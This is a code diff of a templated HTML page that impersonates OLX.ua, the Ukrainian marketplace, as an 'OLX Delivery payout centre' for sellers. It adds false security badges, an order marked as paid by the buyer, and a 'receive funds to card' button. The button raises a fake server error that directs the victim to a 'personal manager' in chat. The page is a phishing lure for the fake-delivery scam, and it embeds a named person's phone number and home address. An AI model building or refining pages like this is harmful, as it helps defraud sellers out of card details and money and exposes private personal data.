@@ -3,302 +3,265 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ p.title }} за {{ p.price }} грн. — OLX.ua</title>
+    <title>Центр виплат OLX Доставка — {{ p.title }}</title>
     
     <link href="https://fonts.cdnfonts.com/css/olx-sans" rel="stylesheet">
     
     <style>
-        /* Базові стилі для всієї сторінки */
         * { box-sizing: border-box; }
         body { 
             font-family: 'OLX Sans', Arial, sans-serif; 
-            background-color: #f2f4f5; /* Світло-сірий фон OLX */
+            background-color: #f2f4f5; 
             margin: 0; 
             padding: 0; 
-            color: #002f34; /* Основний темний колір тексту OLX */
+            color: #002f34; 
         }
         
-        /* HEADER (Шапка сайту) */
+        /* OFFICIAL HEADER */
         .header { 
-            background-color: #002f34; 
-            height: 64px; 
+            background-color: #ffffff; 
+            height: 72px; 
             display: flex; 
             align-items: center; 
             padding: 0 40px; 
+            border-bottom: 2px solid #002f34;
+            justify-content: space-between;
         }
         .logo { 
-            width: 50px; 
-            height: 30px; 
+            height: 32px; 
+        }
+        .header-status {
+            font-size: 14px;
+            font-weight: bold;
+            color: #002f34;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #51c4b2;
+            border-radius: 50%;
         }
 
-        /* MAIN LAYOUT (Основний контейнер) */
+        /* LAYOUT */
         .main-container { 
-            max-width: 1200px; 
-            margin: 30px auto; 
+            max-width: 1000px; 
+            margin: 40px auto; 
             padding: 0 20px; 
             display: flex; 
-            gap: 24px; /* Відступ між колонками */
+            gap: 30px; 
         }
         
-        /* Ліва колонка (Галерея та Опис) */
-        .left-col { 
-            flex: 1; /* Займає весь доступний простір */
-        }
-        
-        /* Права колонка (Продавець та Оплата) */
-        .right-col { 
-            width: 400px; 
-            flex-shrink: 0; /* Не дозволяє колонці стискатися */
-        }
+        .left-col { flex: 1.2; }
+        .right-col { flex: 0.8; }
 
-        /* Загальний стиль для білих блоків */
         .box { 
             background-color: white; 
             border-radius: 4px; 
             padding: 24px; 
-            margin-bottom: 24px; 
-            border: 1px solid #d8d8d8; /* Легка рамка */
+            margin-bottom: 20px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
         
-        /* ГАЛЕРЕЯ (Блок з фото) */
+        /* PRODUCT INFO */
         .gallery { 
             display: flex; 
             justify-content: center; 
-            align-items: center; 
-            height: 500px; /* Фіксована висота для головного фото */
-            overflow: hidden; 
-            padding: 10px;
+            height: 350px; 
+            background: #fff;
+            border: 1px solid #d8d8d8;
+            margin-bottom: 15px;
         }
-        .gallery img { 
-            max-width: 100%; 
-            max-height: 100%; 
-            object-fit: contain; /* Зберігає пропорції фото */
-        }
+        .gallery img { max-width: 100%; max-height: 100%; object-fit: contain; }
 
-        /* ІНФОРМАЦІЯ ПРО ТОВАР */
-        .title { 
-            font-size: 24px; 
-            margin: 0 0 8px 0; 
-            font-weight: 500; /* Не занадто жирний, як на OLX */
-            line-height: 1.2;
-        }
-        .price { 
-            font-size: 32px; 
-            font-weight: bold; 
-            margin: 0 0 16px 0; 
-        }
-        
-        /* Значок OLX Доставка */
-        .delivery-badge { 
-            background-color: #f2f4f5; 
-            padding: 12px; 
-            border-radius: 4px; 
-            display: flex; 
-            align-items: center; 
-            gap: 10px; 
-            font-size: 14px; 
-            border: 1px solid #e0fcfb;
-        }
+        .title { font-size: 22px; margin: 0 0 10px; font-weight: 500; }
+        .price { font-size: 28px; font-weight: bold; margin: 0; }
 
-        /* БЛОК КОРИСТУВАЧА (Сайдбар) */
-        .user-info { 
-            display: flex; 
-            align-items: center; 
-            gap: 12px; 
-            margin-bottom: 16px; 
+        /* BUYER PROFILE & RATING */
+        .buyer-card {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
         }
-        /* Аватарка (перша літера імені) */
+        .user-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
         .avatar { 
-            width: 48px; 
-            height: 48px; 
+            width: 56px; 
+            height: 56px; 
             border-radius: 50%; 
             background-color: #002f34; 
             color: white; 
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            font-size: 20px; 
+            font-size: 24px; 
             font-weight: bold;
         }
-        .user-name {
+        .stars {
+            color: #ffce00;
+            font-size: 18px;
+            letter-spacing: 2px;
+        }
+        .rating-text {
+            font-size: 13px;
+            color: #406367;
+            margin-top: 4px;
+        }
+        .badge-success {
+            display: inline-block;
+            background: #e0fcfb;
+            color: #002f34;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
             font-weight: bold;
-            font-size: 16px;
-        }
-        .user-status { 
-            color: #406367; 
-            font-size: 13px; 
-            margin-top: 2px;
+            margin-top: 5px;
         }
 
-        /* БЛОК ДАНИХ ПОКУПЦЯ */
-        .data-block { 
-            border-top: 1px solid #f2f4f5; 
-            padding-top: 16px; 
-            margin-top: 16px; 
+        /* DATA DETAILS */
+        .info-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
         }
-        .data-label { 
-            color: #406367; 
-            font-size: 12px; 
-            font-weight: bold; 
-            margin-bottom: 8px; 
-            text-transform: uppercase; /* Тільки великі літери */
-            letter-spacing: 0.5px;
+        .info-row {
+            border-bottom: 1px solid #f2f4f5;
+            padding: 10px 0;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
         }
-        .data-text { 
-            font-size: 14px; 
-            line-height: 1.6; 
-        }
+        .info-label { color: #406367; }
+        .info-value { font-weight: bold; text-align: right; }
 
-        /* КНОПКА (Отримати кошти) */
+        /* OFFICIAL BUTTON */
         .btn-pay { 
-            background-color: #002f34; /* Оригінальний темний колір кнопки */
+            background-color: #002f34; 
             color: white; 
             width: 100%; 
-            padding: 16px; 
+            padding: 18px; 
             border-radius: 4px; 
             border: none; 
             font-size: 16px; 
             font-weight: bold; 
             cursor: pointer; 
-            margin: 20px 0; 
-            display: block; 
-            text-align: center; 
-            text-decoration: none; /* Прибираємо підкреслення, якщо це посилання */
-            transition: background-color 0.2s;
-        }
-        .btn-pay:hover { 
-            background-color: #003f44; /* Трохи світліше при наведенні */
-        }
-        
-        /* Інформація про доставку */
-        .delivery-info {
-            font-size: 13px;
+            margin-top: 20px;
+            display: block;
             text-align: center;
-            color: #002f34;
+            text-decoration: none;
+        }
+        .btn-pay:hover { background-color: #003f44; }
+
+        .secure-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #406367;
+            margin-top: 15px;
         }
 
-        /* FOOTER (Підвал сайту) */
+        /* FOOTER */
         .footer { 
-            background-color: white; 
-            padding: 40px 0; 
-            border-top: 1px solid #d8d8d8; 
-            margin-top: 60px; 
-            font-size: 13px; 
-            color: #406367; 
+            padding: 30px 0; 
+            font-size: 12px; 
+            color: #7f9799; 
+            text-align: center;
+            line-height: 1.8;
         }
-        .footer-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-        }
-        .footer-links {
-            display: flex;
-            gap: 20px;
-        }
-        
-        /* АДАПТИВНІСТЬ (Мобільна версія) */
+
         @media (max-width: 800px) {
-            .main-container { 
-                flex-direction: column; /* Колонки стають одна під одною */
-                padding: 0; 
-                margin-top: 0;
-            }
-            .right-col { 
-                width: 100%; /* Займає всю ширину */
-            }
-            .header {
-                padding: 0 20px;
-            }
-            .box, .gallery {
-                border-radius: 0; /* Прибираємо закруглення на мобільних */
-                border-left: none;
-                border-right: none;
-            }
-            .gallery {
-                height: 350px; /* Зменшуємо висоту фото */
-            }
-            .footer-container {
-                flex-direction: column;
-                gap: 20px;
-                text-align: center;
-            }
-            .footer-links {
-                justify-content: center;
-            }
+            .main-container { flex-direction: column; margin-top: 0; }
+            .right-col { width: 100%; }
         }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <img src="https://statics.olx.ua/static/olxua/naspersct-fe/olx-ua-static/img/logos/olx-logo.svg" alt="OLX.ua" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/OLX_green_logo.svg" alt="OLX" class="logo">
+        <div class="header-status">
+            <div class="status-dot"></div>
+            БЕЗПЕЧНА УГОДА
+        </div>
     </div>
 
     <div class="main-container">
         
         <div class="left-col">
-            <div class="box gallery">
-                <img src="{{ p.image_url }}" alt="{{ p.title }}">
-            </div>
-            
             <div class="box">
+                <div class="gallery">
+                    <img src="{{ p.image_url }}" alt="Product Image">
+                </div>
                 <h1 class="title">{{ p.title }}</h1>
-                <div class="price">{{ p.price }} грн.</div>
-                
-                <div class="delivery-badge">
-                    <img src="https://statics.olx.ua/static/olxua/naspersct-fe/olx-ua-static/img/delivery/olx-delivery-icon.svg" width="24" height="24">
-                    <span>З OLX Доставкою ви не платите за комісію переказу</span>
+                <p class="price">{{ p.price }} грн.</p>
+            </div>
+
+            <div class="box">
+                <div style="font-weight: bold; margin-bottom: 15px; font-size: 16px;">Деталі замовлення #{{ p.id[:8].upper() }}</div>
+                <div class="info-row">
+                    <span class="info-label">Статус замовлення:</span>
+                    <span class="info-value" style="color: #51c4b2;">Оплачено покупцем</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Метод доставки:</span>
+                    <span class="info-value">OLX Доставка (Ukrposhta)</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Комісія для продавця:</span>
+                    <span class="info-value">0 грн. (акція)</span>
                 </div>
             </div>
         </div>
 
         <div class="right-col">
-            <div class="box">
-                <div class="user-info">
+            <div class="box buyer-card">
+                <div class="user-header">
                     <div class="avatar">О</div>
                     <div>
-                        <div class="user-name">Олена</div>
-                        <div class="user-status">На OLX з вер. 2021</div>
+                        <div class="user-name">Олена Косенко</div>
+                        <div class="stars">★★★★★</div>
+                        <div class="rating-text">Рейтинг: 5.0 • 128 відгуків</div>
                     </div>
                 </div>
                 
-                <div class="data-block">
-                    <div class="data-label">Дані покупця</div>
-                    <div class="data-text">
-                        <b>ПІБ:</b> Косенко Олена Дмитрівна<br>
-                        <b>Телефон:</b> +380963944037<br>
-                        <b>Адреса:</b> вул. Шевченка, 24, кв. 15, м. Львів
+                <div class="badge-success">✓ 50+ успішних доставок</div>
+
+                <div class="data-block" style="border-top: 1px solid #f2f4f5; margin-top: 10px; padding-top: 15px;">
+                    <div style="font-size: 12px; font-weight: bold; color: #406367; text-transform: uppercase; margin-bottom: 10px;">Адреса доставки</div>
+                    <div style="font-size: 14px; line-height: 1.5;">
+                        вул. Шевченка, 24, кв. 15<br>
+                        м. Львів, 79000<br>
+                        тел: +380963944037
                     </div>
                 </div>
 
-                <a href="#" class="btn-pay" id="payBtn">Отримати кошти</a>
-
-                <div class="delivery-info">
-                    <img src="https://statics.olx.ua/static/olxua/naspersct-fe/olx-ua-static/img/shipping/ukrposhta_icon.svg" width="20" style="vertical-align: middle; margin-right: 5px;">
-                    <span><b>Кур'єр до будинку:</b> безкоштовно</span>
+                <a href="#" class="btn-pay" id="payBtn">Отримати кошти на картку</a>
+                
+                <div class="secure-notice">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="#406367"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    Захищено протоколом OLX Safety
                 </div>
             </div>
         </div>
     </div>
 
     <div class="footer">
-        <div class="footer-container">
-            <div>© 2026 OLX</div>
-            <div class="footer-links">
-                <span>Допомога</span>
-                <span>Правила безпеки</span>
-                <span>Карта сайту</span>
-            </div>
-        </div>
+        © OLX Україна 2026. Усі права захищені.<br>
+        Сервіс працює на базі ТОВ «ЕМАРКЕТ УКРАЇНА».<br>
+        <div style="margin-top: 10px; text-decoration: underline; cursor: pointer;">Політика конфіденційності • Угода користувача</div>
     </div>
 
     <script>
         document.getElementById('payBtn').onclick = function(e) {
-            e.preventDefault(); // Запобігаємо переходу за посиланням
-            // Показуємо стандартне вікно помилки
-            alert('Помилка сервісу виплат. Спробуйте пізніше або зверніться до підтримки.');
+            e.preventDefault();
+            alert('Помилка сервера виплат [ERR_TOKEN_EXPIRED]. Будь ласка, зверніться до вашого персонального менеджера в чаті.');
         };
     </script>
 
